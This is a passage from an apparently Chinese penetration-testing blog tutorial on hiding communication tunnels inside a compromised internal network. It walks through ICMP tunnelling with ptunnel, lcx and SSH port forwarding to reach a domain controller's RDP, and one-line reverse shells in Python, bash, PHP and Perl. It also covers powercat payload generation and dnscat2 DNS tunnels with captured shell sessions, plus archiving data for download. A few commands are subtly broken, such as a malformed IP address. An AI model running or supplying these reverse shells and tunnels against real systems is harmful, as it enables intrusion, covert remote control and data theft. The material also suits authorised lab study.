0x20&lt;link&gt;</span><br><span class="line">        inet6 2409:8a15:3637:5ed0:20c:29ff:fe4f:2524  prefixlen 64  scopeid 0x0&lt;global&gt;</span><br><span class="line">        ether 00:0c:29:4f:25:24  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 12484  bytes 6520141 (6.2 MiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 3141  bytes 662478 (646.9 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 44  bytes 2816 (2.7 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 44  bytes 2816 (2.7 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">web服务器</span><br><span class="line">[root@mail ~]# ifconfig</span><br><span class="line">ens32: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.1.11  netmask 255.255.255.0  broadcast 192.168.1.255</span><br><span class="line">        inet6 2409:8a15:3637:5ed0:63bf:e247:b694:9bca  prefixlen 64  scopeid 0x0&lt;global&gt;</span><br><span class="line">        inet6 fe80::93f3:83a7:a47f:dda4  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:0c:29:a0:ac:5d  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 7482  bytes 1008757 (985.1 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 3140  bytes 833053 (813.5 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">ens34: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 10.1.1.6  netmask 255.255.255.0  broadcast 10.1.1.255</span><br><span class="line">        inet6 fe80::5577:a12e:72b8:66dd  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:0c:29:a0:ac:67  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 851  bytes 366945 (358.3 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 509  bytes 68150 (66.5 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 109  bytes 6323 (6.1 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 109  bytes 6323 (6.1 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">内网DC</span><br><span class="line">C:\Users\Administrator&gt;ipconfig</span><br><span class="line"></span><br><span class="line">Windows IP 配置</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">以太网适配器 Ethernet0:</span><br><span class="line"></span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . : local</span><br><span class="line">   本地链接 IPv6 地址. . . . . . . . : fe80::b12d:4163:32df:fa72%4</span><br><span class="line">   IPv4 地址 . . . . . . . . . . . . : 10.1.1.5</span><br><span class="line">   子网掩码  . . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">   默认网关. . . . . . . . . . . . . : 10.1.1.1</span><br></pre></td></tr></table></figure><p><code>首先web服务器运行</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ptunnel -x pass</span><br></pre></td></tr></table></figure><p><code>kali运行</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ptunnel -p 192.168.1.11 -lp 6666 -da 10.1.1.5 -dp 3389 -x pass</span><br><span class="line">上述命令含义：在访问kali的6666端口，会把DC 10.1.1.5的3389端口封装在ICMP隧道里，以web服务器192.168.1.11为ICMP隧道跳板进行传送。</span><br></pre></td></tr></table></figure><p><code>参数</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-x    指定ICMP隧道连接的验证密码</span><br><span class="line">-lp 指定本地监听的TCP端口</span><br><span class="line">-da 指定要转发的目标机器IP</span><br><span class="line">-dp 指定要转发的目标机器TCP端口</span><br><span class="line">-p  指定ICMP隧道另一端机器的IP</span><br></pre></td></tr></table></figure><p><code>登入</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">desktop 192.168.1.7:6666</span><br><span class="line">desktop 127.0.0.1:6666</span><br><span class="line">windows的mstsc登入也可以</span><br></pre></td></tr></table></figure><img src="/2021/07/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20210722145522318.png" class><img src="/2021/07/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20210722150059749.png" class><img src="/2021/07/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20210722150435797.png" class><img src="/2021/07/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20210722150519192.png" class><h2 id="0x03-传输层隧道"><a href="#0x03-传输层隧道" class="headerlink" title="0x03.传输层隧道"></a>0x03.传输层隧道</h2><h3 id="1-lcx内网端口转发"><a href="#1-lcx内网端口转发" class="headerlink" title="1.lcx内网端口转发"></a>1.lcx内网端口转发</h3><p><code>目标主机执行</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe -slave 192.168.1.2 4444 127.0.0.1 3389    # 将本机3389端口转发到hack机4444端口</span><br></pre></td></tr></table></figure><p><code>hack机执行</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe -listen  4444 5555    #将本机4444端口监听的所有数据传输到5555端口</span><br></pre></td></tr></table></figure><p><code>hack机mstsc 127.0.0.1:5555登入</code></p><img src="/2021/07/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20210722184135571.png" class><img src="/2021/07/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20210722184150355.png" class><h3 id="2-nc"><a href="#2-nc" class="headerlink" title="2.nc"></a>2.nc</h3><p><code>参数</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">-d 后台模式</span><br><span class="line">-e 程序重定向</span><br><span class="line">-g &lt;网关&gt; 设置路由器跃程通信网关，最多可设置8个；</span><br><span class="line">-G &lt;指向器数目&gt; 设置来源路由指向器，其数值为4的倍数；</span><br><span class="line">-h 在线帮助；</span><br><span class="line">-i &lt;延迟秒数&gt; 设置时间间隔，以便传送信息及扫描通信端口；</span><br><span class="line">-l 使用监听模式，管控传入的资料；</span><br><span class="line">-n 直接使用IP地址，而不通过域名服务器；</span><br><span class="line">-o &lt;输出文件&gt; 指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存；</span><br><span class="line">-p &lt;通信端口&gt; 设置本地主机使用的通信端口；</span><br><span class="line">-r 随机指定本地与远端主机的通信端口；</span><br><span class="line">-s &lt;来源位址&gt; 设置本地主机送出数据包的IP地址；</span><br><span class="line">-u 使用UDP传输协议；</span><br><span class="line">-v 详细输出；</span><br><span class="line">-w &lt;超时秒数&gt; 设置等待连线的时间；</span><br><span class="line">-z 将输入输出关掉，只在扫描通信端口时使用。</span><br></pre></td></tr></table></figure><h3 id="3-反弹shell"><a href="#3-反弹shell" class="headerlink" title="3.反弹shell"></a>3.反弹shell</h3><h4 id="01-python反弹shell"><a href="#01-python反弹shell" class="headerlink" title="01.python反弹shell"></a>01.python反弹shell</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.1681.11&quot;,6666));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="02-bash反弹shell"><a href="#02-bash反弹shell" class="headerlink" title="02.bash反弹shell"></a>02.bash反弹shell</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp 192.168.1.11/6666 0&gt;&amp;1</span><br></pre></td></tr></table></figure><h4 id="03-PHP反弹shell"><a href="#03-PHP反弹shell" class="headerlink" title="03.PHP反弹shell"></a>03.PHP反弹shell</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;192.168.1.11&quot;,6666);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="04-Perl反弹shell"><a href="#04-Perl反弹shell" class="headerlink" title="04.Perl反弹shell"></a>04.Perl反弹shell</h4><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;192.168.1.11&quot;;$p=6666;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="4-powercat"><a href="#4-powercat" class="headerlink" title="4.powercat"></a>4.powercat</h3><p><code>Powershell版nc</code></p><p><code>参数</code></p><table><thead><tr><th><strong>参数</strong></th><th><strong>功能</strong></th></tr></thead><tbody><tr><td>-l</td><td>监听入站连接</td></tr><tr><td>-c</td><td>连接目标</td></tr><tr><td>-p</td><td>连接或监听的端口</td></tr><tr><td>-e</td><td>返回某个程序</td></tr><tr><td>-ep</td><td>返回PowerShel</td></tr><tr><td>-r</td><td>端口转发</td></tr><tr><td>-u</td><td>通过UDP隧道传输数据</td></tr><tr><td>-dns</td><td>通过DNS隧道传输数据</td></tr><tr><td>-dnsft</td><td>DNS失效阈值</td></tr><tr><td>-t</td><td>超时选项。默认值：60</td></tr><tr><td>-i</td><td>输入：文件路径（字符串）、字节数组或字符串</td></tr><tr><td>-o</td><td>控制台输出类型：“主机”、“字节”或“字符串”</td></tr><tr><td>-of</td><td>输出文件路径</td></tr><tr><td>-d</td><td>连接后断开</td></tr><tr><td>-rep</td><td>重新启动</td></tr><tr><td>-g</td><td>生成有效载荷</td></tr><tr><td>-ge</td><td>生成编码后的有效载荷</td></tr><tr><td>-h</td><td>帮助信息</td></tr></tbody></table><h4 id="01-Powercat生成payload"><a href="#01-Powercat生成payload" class="headerlink" title="01.Powercat生成payload"></a>01.Powercat生成payload</h4><h5 id="1-正向shell"><a href="#1-正向shell" class="headerlink" title="1.正向shell"></a>1.正向shell</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powercat -l -p 6666 -e cmd -v -g &gt;&gt; shell.ps1</span><br></pre></td></tr></table></figure><p><code>连接</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powercat -c 10.10.10.10 -p 6666 -v</span><br></pre></td></tr></table></figure><h5 id="2-反向shell"><a href="#2-反向shell" class="headerlink" title="2.反向shell"></a>2.反向shell</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powercat -c 10.10.10.10 -p 6666 -e cmd -v -g &gt;&gt; demo.ps1</span><br></pre></td></tr></table></figure><p><code>连接</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powercat -l -p 6666 -v</span><br></pre></td></tr></table></figure><h4 id="02-powercat-DNS隧道"><a href="#02-powercat-DNS隧道" class="headerlink" title="02.powercat DNS隧道"></a>02.powercat DNS隧道</h4><p><code>powercat DNS隧道是基于dnscat设计的，首先安装dnscat</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/iagox86/dnscat2.git</span><br><span class="line">cd dnscat2/server/</span><br><span class="line">gem install bundler</span><br><span class="line">bundle install</span><br></pre></td></tr></table></figure><p><code>kali执行</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby dnscat2.rb ttpowercat.test -e open --no-cache</span><br></pre></td></tr></table></figure><p><code>目标主机执行</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powercat -c 192.168.1.7 -p 53 -dns ttpowercat.test -e cmd.exe</span><br></pre></td></tr></table></figure><p><code>得到shell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">dnscat2&gt;</span><span class="bash"> New window created: 1</span></span><br><span class="line">Session 1 security: UNENCRYPTED</span><br><span class="line"></span><br><span class="line"><span class="meta">dnscat2&gt;</span><span class="bash"> session -i 1</span></span><br><span class="line">New window created: 1</span><br><span class="line">history_size (session) =&gt; 1000</span><br><span class="line">Session 1 security: UNENCRYPTED</span><br><span class="line">This is a console session!</span><br><span class="line"></span><br><span class="line">That means that anything you type will be sent as-is to the</span><br><span class="line">client, and anything they type will be displayed as-is on the</span><br><span class="line">screen! If the client is executing a command and you don&#x27;t</span><br><span class="line">see a prompt, try typing &#x27;pwd&#x27; or something!</span><br><span class="line"></span><br><span class="line">To go back, type ctrl-z.</span><br><span class="line"></span><br><span class="line">Microsoft Windows [???? 10.0.17763.107]</span><br><span class="line">(c) 2018 Microsoft Corporation????????????????</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator&gt;</span><br><span class="line">unnamed 1&gt; </span><br><span class="line">unnamed 1&gt; </span><br><span class="line">C:\Users\Administrator&gt;whoami</span><br><span class="line">unnamed 1&gt; whoami</span><br><span class="line">jiye\administrator</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator&gt;</span><br></pre></td></tr></table></figure><h4 id="03-powercat作为跳板机"><a href="#03-powercat作为跳板机" class="headerlink" title="03.powercat作为跳板机"></a>03.powercat作为跳板机</h4><blockquote><p>环境简介：</p><p>3台机器。server 2019 能与win7和kali互通，kali与win7不能互通，server 2019作为跳板机使kali与win7互通</p></blockquote><p><code>win7执行</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powercat -l -v -p 9999 -e cmd.exe    #本地监听9999端口</span><br></pre></td></tr></table></figure><p><code>server 2019执行</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powercat -l -v -p 8888 -r tcp:10.10.10.20:9999    #本地监听8888端口并转发至10.10.10.20的9999端口</span><br></pre></td></tr></table></figure><p><code>kali</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# nc 192.168.1.5 8888 -vv</span><br><span class="line">192.168.1.5: inverse host lookup failed: Unknown host</span><br><span class="line">(UNKNOWN) [192.168.1.5] 8888 (?) open</span><br><span class="line">Microsoft Windows [�汾 6.1.7601]</span><br><span class="line">��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����</span><br><span class="line"></span><br><span class="line">C:\Users\administrator&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">jiye\administrator</span><br><span class="line"></span><br><span class="line">C:\Users\administrator&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">连接server 2019的8888端口就转发到了win7的9999端口</span></span><br></pre></td></tr></table></figure><p><code>使用DNS协议，与tcp数据流正好相反</code></p><p><code>server 2019</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powercat -l -p 9999 -r dns:192.168.1.7::ttpowercat.test</span><br></pre></td></tr></table></figure><p><code>kali</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby dnscat2.rb ttpowercat.test -e open --no-cache</span><br></pre></td></tr></table></figure><p><code>win7</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powercat -c 10.10.10.10 -p 9999 -v -e cmd.exe</span><br></pre></td></tr></table></figure><p><code>kali得到shell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">dnscat2&gt;</span><span class="bash"> New window created: 1</span></span><br><span class="line">Session 1 security: UNENCRYPTED</span><br><span class="line"></span><br><span class="line"><span class="meta">dnscat2&gt;</span><span class="bash"> session -i 1</span></span><br><span class="line">New window created: 1</span><br><span class="line">history_size (session) =&gt; 1000</span><br><span class="line">Session 1 security: UNENCRYPTED</span><br><span class="line">This is a console session!</span><br><span class="line"></span><br><span class="line">That means that anything you type will be sent as-is to the</span><br><span class="line">client, and anything they type will be displayed as-is on the</span><br><span class="line">screen! If the client is executing a command and you don&#x27;t</span><br><span class="line">see a prompt, try typing &#x27;pwd&#x27; or something!</span><br><span class="line"></span><br><span class="line">To go back, type ctrl-z.</span><br><span class="line"></span><br><span class="line">Microsoft Windows [???? 6.1.7601]</span><br><span class="line">???????? (c) 2009 Microsoft Corporation????????????????</span><br><span class="line"></span><br><span class="line">C:\Users\administrator&gt;ipconfig</span><br><span class="line">unnamed 1&gt; ipconfig</span><br><span class="line"></span><br><span class="line">Windows IP ????</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">???????????? ????????:</span><br><span class="line"></span><br><span class="line">   ?????????? DNS ???? . . . . . . . : </span><br><span class="line">   ???????? IPv6 ????. . . . . . . . : fe80::f161:9ab3:b020:30f1%11</span><br><span class="line">   IPv4 ???? . . . . . . . . . . . . : 10.10.10.20</span><br><span class="line">   ????????  . . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">   ????????. . . . . . . . . . . . . : 10.10.10.2</span><br><span class="line"></span><br><span class="line">?????????? isatap.&#123;40BE814B-BB9A-4845-AADE-41A6B9E99107&#125;:</span><br><span class="line"></span><br><span class="line">   ????????  . . . . . . . . . . . . : ??????????</span><br><span class="line">   ?????????? DNS ???? . . . . . . . : </span><br><span class="line"></span><br><span class="line">C:\Users\administrator&gt;</span><br></pre></td></tr></table></figure><h2 id="0x04-应用层隧道"><a href="#0x04-应用层隧道" class="headerlink" title="0x04.应用层隧道"></a>0x04.应用层隧道</h2><h3 id="1-ssh协议"><a href="#1-ssh协议" class="headerlink" title="1.ssh协议"></a>1.ssh协议</h3><p><code>参数</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-C：压缩传输，提高传输速率。</span><br><span class="line">-f：将SSH传输转入后台执行，不占用当前的shell。</span><br><span class="line">-N：建立静默连接（看不到具体会话）。</span><br><span class="line">-g：允许远程主机连接本地用于转发的端口。</span><br><span class="line">-L：本地端口转发。</span><br><span class="line">-R：远程端口转发。</span><br><span class="line">-D：动态转发（SOCKS代理）。</span><br><span class="line">-P：指定SSH端口。</span><br></pre></td></tr></table></figure><h4 id="01-本地端口转发"><a href="#01-本地端口转发" class="headerlink" title="01.本地端口转发"></a>01.本地端口转发</h4><blockquote><p>测试环境：</p><p>kali可以访问内网web服务器(cnetos 7)，不能访问数据库服务器(win7)，centos 7与win7可以相互访问</p></blockquote><p><code>web服务器为跳板，将win7的3389端口映射到kali的3309端口，访问kali的3309端口就可以访问win7d的3389</code></p><p><code>kali执行</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -L 3309:10.10.10.20:3389 root@192.168.1.11</span><br><span class="line">ssh -CfNg -L 3309&lt;本地端口&gt;:10.10.10.20:3389&lt;目标主机&gt; root@192.168.1.11&lt;跳板机&gt;</span><br></pre></td></tr></table></figure><p><code>登入</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 127.0.0.1:3309</span><br></pre></td></tr></table></figure><img src="/2021/07/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20210723170858890.png" class><h4 id="02-远程端口转发"><a href="#02-远程端口转发" class="headerlink" title="02.远程端口转发"></a>02.远程端口转发</h4><blockquote><p>测试环境：</p><p>kali不可以访问内网所有机器，内网web服务器(centos 7)可以访问kali，内网数据库(win7)不可以访问kali，内网全通。</p></blockquote><p><code>web为跳板机，将kali的3319端口的流量转发到目标主机win7的3389端口，访问kali的3319端口就可以访问win7的3389端口</code></p><p><code>web(centos 7执行)</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -R 3319:10.10.10.20:3389 root@192.168.1.7</span><br><span class="line">ssh -CfNg -R 3319&lt;远程主机kali端口&gt;:10.10.10.20:3389&lt;目标主机win7数据库&gt; root@192.168.1.7&lt;远程主机kali&gt;</span><br></pre></td></tr></table></figure><p><code>登入</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 127.0.0.1:3309</span><br></pre></td></tr></table></figure><img src="/2021/07/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20210723172754616.png" class><blockquote><p>本地端口转发：</p><p>在本地(客户机)监听一个端口，所有访问这个端口的数据都会通过ssh隧道转发到远端对应的端口</p><p>远程端口转发：</p><p>在远程主机上(服务器)监听一个端口，所有访问远程服务器指定端口的数据都会通过ssh隧道传输到本地对应的端口</p></blockquote><h3 id="2-HTTP-HTTPS协议"><a href="#2-HTTP-HTTPS协议" class="headerlink" title="2.HTTP/HTTPS协议"></a>2.HTTP/HTTPS协议</h3><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NlbnNlcG9zdC9yZUdlb3Jn">reGeorg工具<i class="fa fa-external-link-alt"></i></span></p><h3 id="3-DNS协议"><a href="#3-DNS协议" class="headerlink" title="3.DNS协议"></a>3.DNS协议</h3><p><code>此部分内容测试需要公网域名</code></p><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2lhZ294ODYvZG5zY2F0Mg==">dnscat2<i class="fa fa-external-link-alt"></i></span></p><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0FsMWV4L2lvZGluZQ==">iodine<i class="fa fa-external-link-alt"></i></span></p><h2 id="0x05-socks代理"><a href="#0x05-socks代理" class="headerlink" title="0x05.socks代理"></a>0x05.socks代理</h2><p>此部分内容测试需要公网ip与内网环境</p><h3 id="1-EarthWorm"><a href="#1-EarthWorm" class="headerlink" title="1.EarthWorm"></a>1.EarthWorm</h3><h3 id="2-ScoksCap64"><a href="#2-ScoksCap64" class="headerlink" title="2.ScoksCap64"></a>2.ScoksCap64</h3><h3 id="3-Proxychains"><a href="#3-Proxychains" class="headerlink" title="3.Proxychains"></a>3.Proxychains</h3><h2 id="0x06-压缩数据"><a href="#0x06-压缩数据" class="headerlink" title="0x06.压缩数据"></a>0x06.压缩数据</h2><p>渗透过程中常常要下载数据，这里有几种将数据进行压缩方便下载的技术</p><h3 id="1-RAR"><a href="#1-RAR" class="headerlink" title="1.RAR"></a>1.RAR</h3><p><code>这里提取出winrar下的rar.exe，参数如下：</code></p><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>-a</td><td>添加要压缩的文件</td></tr><tr><td>-k</td><td>锁定压缩文件</td></tr><tr><td>-s</td><td>生成存档文件（提高压缩比）</td></tr><tr><td>-p</td><td>指定压缩密码</td></tr><tr><td>-r</td><td>递归压缩，包括子目录</td></tr><tr><td>-x</td><td>指定要排除的文件</td></tr><tr><td>-v</td><td>分卷打包，大文件使用</td></tr><tr><td>-ep</td><td>从名称中排除路径</td></tr><tr><td>-ep1</td><td>从名称中排除基本目录</td></tr><tr><td>-m0</td><td>存储，添加到压缩文件时不压缩文件</td></tr><tr><td>-m1</td><td>最快</td></tr><tr><td>-m2</td><td>较快</td></tr><tr><td>-m3</td><td>标准</td></tr><tr><td>-m4</td><td>较好</td></tr><tr><td>-m5</td><td>最好</td></tr></tbody></table><h3 id="2-7-zip"><a href="#2-7-zip" class="headerlink" 